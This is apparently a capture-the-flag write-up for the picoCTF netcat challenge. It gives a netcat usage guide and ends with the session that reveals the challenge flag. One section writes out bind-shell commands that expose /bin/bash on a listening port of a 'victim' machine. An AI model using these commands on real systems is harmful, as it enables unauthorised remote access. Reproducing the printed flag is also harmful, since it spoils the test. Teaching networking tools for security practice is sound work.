# [what's a net cat?](https://play.picoctf.org/practice/challenge/34)

---

# 📘 Netcat (`nc`) – Brief Documentation & Usage

## 🔹 What is Netcat?

`nc` (netcat) is a powerful command-line utility in Linux used for **reading and writing data across network connections** using TCP or UDP.
It is often called the *"Swiss-army knife of networking"* because it can act as:

* A **client** (connect to a remote host/port).
* A **server/listener** (open a port and wait for connections).
* A tool for **file transfer**, **port scanning**, and **debugging network services**.

---

## 🔹 General Syntax

```bash
nc [options] [hostname] [port]
```

* **hostname** → IP or domain name (e.g., `127.0.0.1`, `example.com`).
* **port** → TCP/UDP port number (e.g., `80`, `443`, `9001`).

---

## 🔹 Common Options

| Option      | Description                             |
| ----------- | --------------------------------------- |
| `-l`        | Listen mode (server).                   |
| `-p <port>` | Specify local port (when listening).    |
| `-u`        | Use UDP instead of TCP.                 |
| `-v`        | Verbose output (useful for debugging).  |
| `-z`        | Zero-I/O mode (used for port scanning). |
| `-n`        | Numeric only (skip DNS lookup).         |
| `-w <sec>`  | Timeout for connects/receives.          |

---

## 🔹 Usage Examples

### 1. Connect to a remote service (Client Mode)

```bash
nc example.com 80
```

* Opens TCP connection to port **80** of `example.com`.
* Useful for manually sending HTTP requests.

---

### 2. Start a listener (Server Mode)

```bash
nc -l -p 1234
```

* Opens TCP server on port **1234**.
* Waits for a client to connect.

---

### 3. Simple Chat between two systems

* **On machine A (listener):**

  ```bash
  nc -l -p 4444
  ```
* **On machine B (client):**

  ```bash
  nc <IP_of_machine_A> 4444
  ```

Now you can chat by typing text back and forth.

---

### 4. File Transfer

* **Send file (sender):**

  ```bash
  nc -l -p 9000 < file.txt
  ```
* **Receive file (receiver):**

  ```bash
  nc <sender_IP> 9000 > file.txt
  ```

---

### 5. Port Scanning

```bash
nc -zv 192.168.1.10 20-100
```

* Scans ports **20–100** on host `192.168.1.10`.
* Reports which ports are open.

---

### 6. Banner Grabbing (Service Fingerprinting)

```bash
nc -v example.com 21
```

* Connects to FTP port (21) and displays the service banner.

---

### 7. Bind Shell (Reverse Shell for CTFs ⚠️)

* **On victim (listener):**

  ```bash
  nc -l -p 4444 -e /bin/bash
  ```
* **On attacker (client):**

  ```bash
  nc <victim_IP> 4444
  ```

This gives remote shell access.
(*Note: Modern `nc` versions may disable `-e` for security reasons. Use `ncat` or workarounds in CTFs.*)


---

## 🔹 Summary

* **`nc` is versatile**: client, server, file transfer, scanner.
* **Essential for CTFs & debugging**: quickly connect, send/receive raw data, test services.
* **Careful in real environments**: it can be misused for backdoors.

---

### what's a net cat?
```bash
┌──(sumit㉿kali)-[~/Desktop/CTF]
└─$ nc jupiter.challenges.picoctf.org 64287
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_284be8f7}
```

